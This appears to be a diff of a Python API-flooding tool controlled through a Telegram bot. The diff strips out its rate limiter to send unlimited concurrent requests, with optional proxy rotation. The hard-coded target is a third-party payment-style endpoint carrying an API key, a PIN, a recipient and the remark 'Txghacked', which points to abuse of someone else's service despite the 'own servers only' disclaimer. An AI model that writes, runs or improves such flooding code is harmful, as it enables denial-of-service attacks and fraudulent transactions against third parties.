@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-Rate‑limited API flooder – 200 req/s with Telegram bot control.
+Infinite API flooder with Telegram bot control.
 Use ONLY on your own servers.
 """
 import asyncio
@@ -8,9 +8,10 @@ import aiohttp
 import random
 import string
 import time
+import logging
 import signal
 import sys
-from telegram import Update
+from telegram import Update, BotCommand
 from telegram.ext import Application, CommandHandler, ContextTypes
 
 # ─── TELEGRAM CONFIG ──────────────────────────────────────
@@ -23,9 +24,9 @@ TARGET_APIS = [
     "https://txg-gateway.xyz/client/api/send.php?api_key=f692ed462bc0976b5332a11944103df7&secret_pin=123456&toUser=9359202967&amount=1&remark=Txghacked"
 ]
 
-RATE_LIMIT = 500                # total requests per second
-CONCURRENT = 3000                # max simultaneous tasks (a bit above rate)
+CONCURRENT = 5000                # Adjust for speed
 TOTAL_REQUESTS = 0              # 0 = infinite
+REQUEST_DELAY = 0
 USE_PROXIES = False
 PROXY_FILE = "proxies.txt"
 
@@ -34,7 +35,9 @@ stats = {'sent': 0, 'ok': 0, 'fail': 0}
 lock = asyncio.Lock()
 start_time = time.time()
 flooder_running = True
+loop = None
 
+# ─── PROXY LOADER ──────────────────────────────────────────
 def load_proxies():
     try:
         with open(PROXY_FILE) as f:
@@ -48,7 +51,7 @@ def random_comment(length=8):
 def build_url(base):
     return base.format(comment=random_comment())
 
-# ─── RATE‑LIMITED FLOODER ────────────────────────────────
+# ─── ASYNC FLOODER ────────────────────────────────────────
 async def fire(session, sem, url, proxy=None):
     global stats
     async with sem:
@@ -72,53 +75,22 @@ async def flooder_task():
     connector = aiohttp.TCPConnector(limit=CONCURRENT * 2, limit_per_host=CONCURRENT, force_close=False)
     async with aiohttp.ClientSession(connector=connector) as session:
         tasks = set()
-        total_sent = 0
-        # Rate limiter: send exactly RATE_LIMIT requests per second
-        # We'll split evenly across APIs
-        apis = TARGET_APIS
-        if not apis:
-            return
-        per_api = RATE_LIMIT // len(apis)
-        remainder = RATE_LIMIT % len(apis)
-
-        while flooder_running and (TOTAL_REQUESTS == 0 or total_sent < TOTAL_REQUESTS):
-            # Determine how many to send this second
-            to_send = min(RATE_LIMIT, TOTAL_REQUESTS - total_sent) if TOTAL_REQUESTS > 0 else RATE_LIMIT
-            # Distribute
-            counts = [per_api] * len(apis)
-            for i in range(remainder):
-                counts[i] += 1
-            # Adjust if total_sent limit is near
-            if TOTAL_REQUESTS > 0:
-                remaining = TOTAL_REQUESTS - total_sent
-                for i in range(len(counts)):
-                    if remaining <= 0:
-                        counts[i] = 0
-                    else:
-                        counts[i] = min(counts[i], remaining)
-                        remaining -= counts[i]
-
-            start_sec = time.time()
-            # Spawn tasks for this batch
-            for idx, base in enumerate(apis):
-                for _ in range(counts[idx]):
-                    if not flooder_running:
-                        break
-                    url = build_url(base)
-                    proxy = random.choice(proxies) if proxies else None
-                    task = asyncio.create_task(fire(session, sem, url, proxy))
-                    tasks.add(task)
-                    total_sent += 1
-            # Wait until the second is over (so we send exactly per second)
-            elapsed = time.time() - start_sec
-            if elapsed < 1.0:
-                await asyncio.sleep(1.0 - elapsed)
-            # Clean up completed tasks
-            if tasks:
-                done, tasks = await asyncio.wait(tasks, timeout=0, return_when=asyncio.FIRST_COMPLETED)
-                tasks = set(tasks)
-
-        # Wait for remaining tasks to finish
+        count = 0
+        while flooder_running and (TOTAL_REQUESTS == 0 or count < TOTAL_REQUESTS):
+            for base in TARGET_APIS:
+                if not flooder_running or (TOTAL_REQUESTS != 0 and count >= TOTAL_REQUESTS):
+                    break
+                url = build_url(base)
+                proxy = random.choice(proxies) if proxies else None
+                task = asyncio.create_task(fire(session, sem, url, proxy))
+                tasks.add(task)
+                count += 1
+                # Clean up completed tasks occasionally
+                if len(tasks) > CONCURRENT * 2:
+                    done, tasks = await asyncio.wait(tasks, timeout=0, return_when=asyncio.FIRST_COMPLETED)
+                    tasks = set(tasks)  # keep only pending
+                await asyncio.sleep(0)  # yield
+        # Wait for remaining tasks to finish (if stopping)
         if tasks:
             await asyncio.wait(tasks, timeout=5)
 
@@ -127,7 +99,7 @@ async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id != ADMIN_ID:
         await update.message.reply_text("⛔ Unauthorized.")
         return
-    await update.message.reply_text(f"🔥 Flooder is live! {RATE_LIMIT} req/s.\n/status, /stop, /startflood")
+    await update.message.reply_text("✅ Flooder is running. Use /status, /stop, /start, /stats")
 
 async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id != ADMIN_ID:
@@ -139,7 +111,7 @@ async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
            f"✅ OK: {stats['ok']}\n"
            f"❌ Errors: {stats['fail']}\n"
            f"⏱️ Uptime: {int(elapsed)}s\n"
-           f"⚡ Avg Rate: {rate:.1f} req/s\n"
+           f"⚡ Rate: {rate:.1f} req/s\n"
            f"🔄 Running: {'Yes' if flooder_running else 'No'}")
     await update.message.reply_text(msg)
 
@@ -154,7 +126,7 @@ async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text("🛑 Stopping flooder gracefully...")
 
 async def start_flooder(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    global flooder_running, start_time, stats
+    global flooder_running, start_time
     if update.effective_user.id != ADMIN_ID:
         return
     if flooder_running:
@@ -162,11 +134,16 @@ async def start_flooder(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
     flooder_running = True
     start_time = time.time()
+    # Reset stats if needed
     stats['sent'] = 0
     stats['ok'] = 0
     stats['fail'] = 0
     asyncio.create_task(flooder_task())
-    await update.message.reply_text("▶️ Flooder started at 200 req/s.")
+    await update.message.reply_text("▶️ Flooder started.")
+
+async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    # Alias for /status
+    await status_command(update, context)
 
 # ─── PERIODIC REPORT ──────────────────────────────────────
 async def send_periodic_report(context: ContextTypes.DEFAULT_TYPE):
@@ -174,7 +151,7 @@ async def send_periodic_report(context: ContextTypes.DEFAULT_TYPE):
         return
     elapsed = time.time() - start_time
     rate = stats['sent'] / elapsed if elapsed > 0 else 0
-    msg = (f"📊 **Auto Report**\n"
+    msg = (f"📊 **Periodic Report**\n"
            f"📤 Sent: {stats['sent']}\n"
            f"✅ OK: {stats['ok']}\n"
            f"❌ Errors: {stats['fail']}\n"
@@ -183,24 +160,33 @@ async def send_periodic_report(context: ContextTypes.DEFAULT_TYPE):
 
 # ─── MAIN ──────────────────────────────────────────────────
 async def main():
+    global loop
+    loop = asyncio.get_running_loop()
+
+    # Start the flooder
     asyncio.create_task(flooder_task())
 
+    # Setup Telegram bot
     app = Application.builder().token(BOT_TOKEN).build()
     app.add_handler(CommandHandler("start", start_command))
     app.add_handler(CommandHandler("status", status_command))
     app.add_handler(CommandHandler("stop", stop_command))
     app.add_handler(CommandHandler("startflood", start_flooder))
+    app.add_handler(CommandHandler("stats", stats_command))
 
+    # Start periodic reports every 30 seconds
     job_queue = app.job_queue
     if job_queue:
         job_queue.run_repeating(send_periodic_report, interval=30, first=10)
 
-    await app.bot.send_message(chat_id=ADMIN_ID, text="🔥 **Flooder online** – 200 req/s.\n/status for stats, /stop to halt.")
+    # Send startup message
+    await app.bot.send_message(chat_id=ADMIN_ID, text="🔥 Flooder started. Bot online.")
 
+    # Start polling (this runs forever)
     await app.initialize()
     await app.start()
     await app.updater.start_polling()
-
+    # Keep running until interrupted
     try:
         while True:
             await asyncio.sleep(60)
@@ -211,13 +197,15 @@ async def main():
         await app.stop()
 
 if __name__ == "__main__":
+    # Handle graceful shutdown
     def signal_handler(sig, frame):
         global flooder_running
-        print("Shutting down...")
+        print("Received interrupt. Stopping flooder...")
         flooder_running = False
         sys.exit(0)
     signal.signal(signal.SIGINT, signal_handler)
     signal.signal(signal.SIGTERM, signal_handler)
+
     try:
         asyncio.run(main())
     except KeyboardInterrupt:
